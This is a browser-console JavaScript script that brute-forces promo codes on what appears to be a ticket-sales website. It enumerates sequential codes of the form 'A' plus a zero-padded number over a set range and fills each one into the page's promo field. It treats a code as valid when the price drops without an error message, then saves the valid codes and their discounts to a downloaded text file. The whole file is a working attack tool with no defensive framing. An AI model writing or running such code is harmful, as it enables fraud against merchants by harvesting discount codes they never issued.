//////Option////////
let start = 459500;
let end = 459600;
///////////////////
let oldPrice;
let priceDiff;
let priceLoc = "div.tickets > span:nth-child(3)";
let promocodeLoc = ".promocode-input";
let promocodeErrorLoc = ".promocode-error";
let db = "";

function getPrice() {
    return Number.parseInt(document.querySelector(priceLoc).innerText)
}

function setPromocode(promocode) {
    var input = document.querySelector(promocodeLoc)
    var nativeInputValueSetter = Object.getOwnPropertyDescriptor(window.HTMLInputElement.prototype, "value").set;
    nativeInputValueSetter.call(input, promocode);

    var ev2 = new Event('input', { bubbles: true });
    input.dispatchEvent(ev2);
}

function verifyPromocode() {
    priceDiff = oldPrice - getPrice();
    let resault = document.querySelector(promocodeErrorLoc).innerText == "" &&
        priceDiff != 0;
    return resault;
}

function createPromocode(i) {
    let countNumber = i.toString().length;
    let promocode = "A";
    for (; countNumber < 6; countNumber++) {
        promocode += "0";
    }
    return promocode += i;
}

function setPrTimeout(ms) {
    var promise = new Promise((resolve) => {
        setTimeout(() => {
            resolve();
        }, ms);
    });
    return promise;
}

// Function to download data to a file
function download(data, filename, type) {
    var file = new Blob([data], { type: type });
    if (window.navigator.msSaveOrOpenBlob) // IE10+
        window.navigator.msSaveOrOpenBlob(file, filename);
    else { // Others
        var a = document.createElement("a"),
            url = URL.createObjectURL(file);
        a.href = url;
        a.download = filename;
        document.body.appendChild(a);
        a.click();
        setTimeout(function() {
            document.body.removeChild(a);
            window.URL.revokeObjectURL(url);
        }, 0);
    }
}

function formatDate(date) {
    var dd = date.getDate();
    if (dd < 10) dd = '0' + dd;
    var mm = date.getMonth() + 1;
    if (mm < 10) mm = '0' + mm;
    var yy = date.getFullYear() % 100;
    if (yy < 10) yy = '0' + yy;
    return dd + '.' + mm + '.' + yy;
}

setPromocode(createPromocode(0))
oldPrice = getPrice();
for (var i = start; i <= end; i++) {
    setPromocode(createPromocode(i));
    await setPrTimeout(1000);
    if (verifyPromocode()) {
        newPrice = getPrice();
        console.log(createPromocode(i) + " discount: " + priceDiff);
        db += createPromocode(i) + " discount: " + priceDiff + "\r\n";
    } else {
        //  console.log("- " +createPromocode(i));
    }
}
download(db, "file_" + formatDate(new Date) + "_" + start + "-" + end + ".txt", "text/txt");